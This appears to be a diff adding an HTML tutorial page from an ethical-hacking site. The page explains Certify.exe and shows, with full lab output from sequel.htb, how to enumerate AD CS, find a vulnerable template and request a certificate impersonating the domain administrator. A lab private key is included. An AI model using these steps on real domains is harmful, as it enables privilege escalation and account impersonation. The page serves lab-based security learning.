@@ -1,0 +1,291 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>What is <code>certify.exe</code>?</h1>
+    <p class="common"><code>Certify.exe</code> is a tool (part of the GhostPack/Certify family) for enumerating and interacting with Active Directory Certificate Services (AD CS). It lets an operator discover CAs and templates, test template permissions/weaknesses, and submit certificate requests.</p>
+
+    <h1>What is ADCS?</h1>
+    <p class="common">AD CS is an acronym for Active Directory Certificate Services, a Microsoft role in Windows Server that manages public key infrastructure (PKI) and digital certificates. It allows organizations to issue and manage digital certificates used for encrypting communications, authenticating users and devices, and creating digital signatures, ensuring data integrity and confidentiality within a network.</p>
+    <p class="common">Like Kerberos, you can use this to intercomunicate OUs.</p>
+
+    <h1>Usage</h1>
+    <h2 class="blue">Enumerates reachable CA</h2>
+    <div class="code-box"><pre><code>.\Certify.exe cas</code></pre></div>
+    <ul>
+        <li><strong>What it does (high level):</strong> enumerates reachable Certificate Authorities in the domain and prints basic information about them (CA hostnames, service names, supported protocols/ports, maybe their CA types and templates).</li>
+        <li><strong>Why useful:</strong> finding which machines run AD CS and which CA objects exist is the first step for assessing AD CS attack surface.</li>
+        <li><strong>Output you'll see:</strong> list of CA objects / endpoints and metadata about each CA.</li>
+    </ul>
+
+    <h2 class="blue">Identify templates that are misconfigured or have weak ACLs</h2>
+    <div class="code-box"><pre><code>.\Certify.exe find /vulnerable</code></pre></div>
+    <ul>
+        <li><strong>What it does (high level):</strong> scans CA(s) and their certificate templates to identify templates that are misconfigured or have weak ACLs — i.e., templates that allow low-privilege users to enroll or to supply arbitrary subject/SANs. It flags templates that could be abused to obtain certificates for other identities.</li>
+        <li><strong>Why useful: </strong>identifies vulnerable templates that, if abused, may allow elevation (for example, issuing a cert that represents another user/machine or a high-privilege account).</li>
+        <li><strong>Output you'll see:</strong> a list of templates and a vulnerability status/notes (which template permissions allow which actions).</li>
+    </ul>
+
+    <h2 class="blue">Request a certificate</h2>
+    <div class="code-box"><pre><code>.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator</code></pre></div>
+    <ul>
+        <li><strong>What it does (high level):</strong> attempts to request a certificate from the specified CA (dc.sequel.htb\sequel-DC-CA) using the named template (UserAuthentication) and requests that the certificate include an alternative name (altname:administrator). In other words, it submits a certificate enrollment request that asks the CA to issue a cert for the given alt-name/subject.</li>
+        <li><strong>Important nuance / prerequisites:</strong></li>
+        <li>Whether the CA issues the certificate depends on the template ACLs and CA policy. The requesting account must have whatever enrollment rights the template requires.</li>
+        <li>Some templates allow the requester to supply the subject or SAN (or allow enrollments by low-privilege users) — if so, an attacker could request a cert that appears to represent another identity.</li>
+        <li><strong>Possible outcomes: </strong>request is denied (insufficient rights), request is pending (requires manual approval by CA admins), or CA issues a certificate (meaning the template/CA policy allowed it).</li>
+    </ul>
+
+
+    <h1>Real output and analysis</h1>
+
+    <div class="code-box"><pre><code>*Evil-WinRM* PS C:\ProgramData> .\Certify.exe cas
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Find certificate authorities
+[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'
+
+
+[*] Root CAs
+
+    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
+    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
+    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
+    Cert Start Date               : 11/18/2022 12:58:46 PM
+    Cert End Date                 : 11/18/2121 1:08:46 PM
+    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
+
+
+
+[*] NTAuthCertificates - Certificates that enable authentication:
+
+    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
+    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
+    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
+    Cert Start Date               : 11/18/2022 12:58:46 PM
+    Cert End Date                 : 11/18/2121 1:08:46 PM
+    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
+
+
+[*] Enterprise/Enrollment CAs:
+
+    Enterprise CA Name            : sequel-DC-CA
+    DNS Hostname                  : dc.sequel.htb
+    FullName                      : dc.sequel.htb\sequel-DC-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
+    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
+    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
+    Cert Start Date               : 11/18/2022 12:58:46 PM
+    Cert End Date                 : 11/18/2121 1:08:46 PM
+    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+    Enrollment Agent Restrictions : None
+
+    Enabled Certificate Templates:
+        UserAuthentication
+        DirectoryEmailReplication
+        DomainControllerAuthentication
+        KerberosAuthentication
+        EFSRecovery
+        EFS
+        DomainController
+        WebServer
+        Machine
+        User
+        SubCA
+        Administrator
+</code></pre></div>
+    <div class="code-box"><pre><code>*Evil-WinRM* PS C:\ProgramData> .\Certify.exe find /vulnerable
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'
+
+[*] Listing info about the Enterprise CA 'sequel-DC-CA'
+
+    Enterprise CA Name            : sequel-DC-CA
+    DNS Hostname                  : dc.sequel.htb
+    FullName                      : dc.sequel.htb\sequel-DC-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
+    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
+    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
+    Cert Start Date               : 11/18/2022 12:58:46 PM
+    Cert End Date                 : 11/18/2121 1:08:46 PM
+    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+    Enrollment Agent Restrictions : None
+
+[!] Vulnerable Certificates Templates :
+
+    CA Name                               : <u>dc.sequel.htb\sequel-DC-CA</u>
+    Template Name                         : <u>UserAuthentication</u>
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
+                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+      Object Control Permissions
+        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
+        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
+                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
+                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
+                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+
+</code></pre></div>
+    <div class="code-box"><pre><code>*Evil-WinRM* PS C:\ProgramData> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Request a Certificates
+
+[*] Current user context    : sequel\Ryan.Cooper
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : UserAuthentication
+[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
+[*] AltName                 : administrator
+
+[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA
+
+[*] CA Response             : The certificate had been issued.
+[*] Request ID              : 14
+
+[*] cert.pem         :
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAtUZ+WXaIpX1EIOyQWjRw9A32WHcva28aXBCRsp1BEakIVBtd
+yRA0px6K6UuhfSp3JrjazOOxAjK+Zv0q6CtHRQabis7/Mn/di226GYiutvwokZ24
+cIN+8BUmM8RUEXd+rGfWzijgQIhcCg0JU1ti9Xk5Nh/dgqqcIkcj8WsQC8tyvlpK
+E40pbiPG4vcrgU+bSVwMs8tRLZsXq8MYqsfe9PgLz2aL9AQsoJWuJrSE2JORq46T
+yjdgnnOz+lqA7bmTznu3hl7cfiX5MmgJ7mMy7tPyrWZSYEBQ1t4Lvvhm8meO9a3Y
+a9LWYv/wotHSU2BiN2xexrdo5X7io0YO5TaP3QIDAQABAoIBAQCbZCFdKTn7uoTT
+QFaBrOCCpRFeRlTU4HmVH/L1TM4BiIeGKatcdtLby1fCor184REglWeiKTCMNNl4
+yV6lhKvkZMSi2cxzCp7sLZRQ3RT/8OoJ4UzAzkfbIBYOXCbAjlF9EspVET8isoFL
+cF9lIDqVOGQtnGUy5HNRAvCxu1gW8s9F/bi2Oi3CMzURt0/899fuoYycEDMfJL+4
+ObvovDaN0/8O29deYk4fvSsdM5Ig4r6QE5FYsSrJaV0iOOnpac22tGigI3v2RIe+
+XcExjJ5TiRvD8/4xGRbVIFEQ0XDzI4J3PQ+I0IzZbhp1IUsJndhuy6gIrS+GTMvF
+2ODmlQK1AoGBANgC2fdzMf7Q5bgy2hkX3o4a4WEOOgSWr+oW6oNCYIkDJA/88HuW
+H7aWcuKTFUwcBUYzFwg1Sduy8+8r644TGtXXxnhFyr+nz+GJmzUO0zWkQnSh0Y+V
+PqYtf1E1QON25w+2ARkZNyr9tJmGMYyZeiE79SKq5q9RskVTEo7jnCNPAoGBANbV
+c97F346buaI6+3K7y0Of8orPz4EKwTSV37I+/rDLbMRGTTlrJAW/yhQNRyijvopz
+qKznp8K1VeXYdCbn0WxC6poU6zP0kZ+LpckpKBpFsMTwzTAZGcp+r2qJfJgsKQn7
+yxoF5uskSCDR/rHBkbSgw/t1e/m3sArqpNpnOL8TAoGBAMuvHKLVb64sgoCHCtqg
+hE4RELY4+QI8qNIeG7H7lBV97bJZutV+QJcmFFyLfoiO33ZLVIt73BIbEyNSkcId
+R6+e0Fm2zbCc50tvOvfz67roEXXy5Cz0+OcvfZ8wjOgvxT8uSqjE+x1Br9sYC37d
+dakC5Wp0JiPo8CWoaJZuD1vHAoGAfys3PaWP4hDYX+neMlprxgoGPpko0dAV8hTN
+p+uWQ/0G02ByEg0T87tF2XzKpInZHoe8Ty2Jpr5ErJvmlakf1J//01mSqNya3wCB
+EISmUnbyXoHUVCZnl/BJ0hy0fjeVy20bGrpnqMV/VL45r+tPXsbTfCRdUMKlGLEx
+CH+VnbUCgYBNsmIdx+//7jHTjqNrHfBiT/Lg7naU5kEhlxRCGhX1vx35APpS3EOa
+N/0dZsFY4QTT9N4XRkLcGlCq7sYmL3zqKdc7JZPTF2DhU0r4w230NbkstqBSFKnf
+50LZGkxqlZsc0Idq6Jw1iEsLfsCL2Uey8P9+Dl32kjAdnYJz+J2Vrg==
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIGEjCCBPqgAwIBAgITHgAAAA5UG4DUDMEEugAAAAAADjANBgkqhkiG9w0BAQsF
+ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
+MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjUxMTA3MTgzNjMyWhcNMzUxMTA1
+MTgzNjMyWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
+c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
+MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC1Rn5ZdoilfUQg7JBaNHD0DfZY
+dy9rbxpcEJGynUERqQhUG13JEDSnHorpS6F9KncmuNrM47ECMr5m/SroK0dFBpuK
+zv8yf92LbboZiK62/CiRnbhwg37wFSYzxFQRd36sZ9bOKOBAiFwKDQlTW2L1eTk2
+H92CqpwiRyPxaxALy3K+WkoTjSluI8bi9yuBT5tJXAyzy1Etmxerwxiqx970+AvP
+Zov0BCygla4mtITYk5GrjpPKN2Cec7P6WoDtuZPOe7eGXtx+JfkyaAnuYzLu0/Kt
+ZlJgQFDW3gu++GbyZ471rdhr0tZi//Ci0dJTYGI3bF7Gt2jlfuKjRg7lNo/dAgMB
+AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
+lTWDv8NZg4nKNYF338oIhp7sKQIBZQIBBDApBgNVHSUEIjAgBggrBgEFBQcDAgYI
+KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
+CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
+hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
+Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFIHwXvkfQ1qFQV2paUzVfMtLOfs5
+MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1hZG1pbmlzdHJhdG9yMB8GA1Ud
+IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
+gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
+bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
+bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
+ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
+gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
+QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
+bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
+b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
+AAOCAQEADbB5DQ0XpkVYoFlXCERqAc4fl6+3+0+4X3MiIK2ysivngn4oSv6ScukK
+Cb88n8+bpYar6C3OmgkGk78/atEX0PXor+nAc+hbN30KaGQNSNjh45J2KGzZsaqA
+XhYgn69RJCETtepW9eC310/DLC1cGMtAHcYVwTEOabDDMZ//awyTtrx7x1+gMGQt
+3X1W5Ts1uQj44LTyun3d2g0RFFM7fnwVLka8ZIv6ZUA7bOLttjguXqDB46NW6nja
+vq3DDfxjdbinPajiaq9Jd0Z2G4Dih3qsMKGQuLAbhvjmKqoXwlyKX1auepKUO1w1
+t9T2oztRATKcucdsZcwuKtutEZ4zYA==
+-----END CERTIFICATE-----
+
+
+[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+
+</code></pre></div>
+
+
+</body>
+</html>
